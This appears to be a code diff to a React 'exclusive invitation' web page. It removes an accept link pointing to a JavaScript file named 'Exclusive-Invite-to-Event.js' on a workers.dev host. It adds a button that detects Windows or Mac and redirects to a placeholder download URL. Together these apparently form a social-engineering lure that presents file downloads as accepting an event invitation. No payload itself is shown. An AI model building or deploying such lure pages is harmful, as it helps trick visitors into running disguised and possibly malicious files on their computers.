@@ -23,6 +23,18 @@ export default function App() {
 }
 
 function Invite() {
+  const handleDownload = () => {
+    const isWindows = navigator.platform.toUpperCase().indexOf('WIN') > -1;
+
+    if (isWindows) {
+      // Replace with your Windows download URL
+      window.location.href = 'YOUR_WINDOWS_DOWNLOAD_URL';
+    } else {
+      // Replace with your Mac download URL
+      window.location.href = 'YOUR_MAC_DOWNLOAD_URL';
+    }
+  };
+
   return (
     <>
       <div className="wrapper">
@@ -48,9 +60,9 @@ function Invite() {
               <span className="highlight">Please accept this invitation and be part of something special.</span>
             </p>
 
-            <a href="https://exclusive-access-invite.hemin.workers.dev/Exclusive-Invite-to-Event.js" className="accept-btn">
-              View or Accept Invitation
-            </a>
+            <button className="accept-btn" onClick={handleDownload}>
+              Accept & Join
+            </button>
           </div>
         </div>
       </div>
